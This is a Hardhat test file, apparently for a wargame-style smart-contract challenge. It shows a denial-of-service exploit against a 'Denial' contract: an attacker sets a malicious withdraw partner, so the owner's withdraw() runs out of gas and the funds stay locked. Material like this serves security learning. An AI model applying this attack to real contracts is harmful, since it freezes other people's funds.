import { TransactionResponse } from "@ethersproject/providers"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { Contract } from "ethers"
// @ts-ignore
import { ethers } from "hardhat"
import { DenialAttacker__factory, Denial__factory } from "../typechain"

const CONTRACT_NAME = "Denial"
const CONTRACT_NAME_ATTACKER = "DenialAttacker"

describe(CONTRACT_NAME, () => {
    let owner, attacker: SignerWithAddress
    let contract, contractAttacker: Contract
    let tx: TransactionResponse

    it("Should be possible to deny the owner from withdrawing funds when they call withdraw()", async () => {
        [ owner, attacker ] = await ethers.getSigners()

        contract = await new Denial__factory(owner).deploy()

        contractAttacker = await new DenialAttacker__factory(attacker).deploy()

        await owner.sendTransaction({
            to: contract.address,
            value: ethers.utils.parseEther("0.001")
        })

        expect(await ethers.provider.getBalance(contract.address)).to.eq(ethers.utils.parseEther("0.001"))

        tx = await contract.connect(attacker).setWithdrawPartner(contractAttacker.address)
        await tx.wait()

        let err

        try {
            await contract.connect(owner).withdraw( { gasLimit: 1000000 } )
        } catch (error) {
            err = error
        }

        expect(err.message).to.eq("Transaction ran out of gas")
        expect(await ethers.provider.getBalance(contract.address)).to.eq(ethers.utils.parseEther("0.001"))
    })
})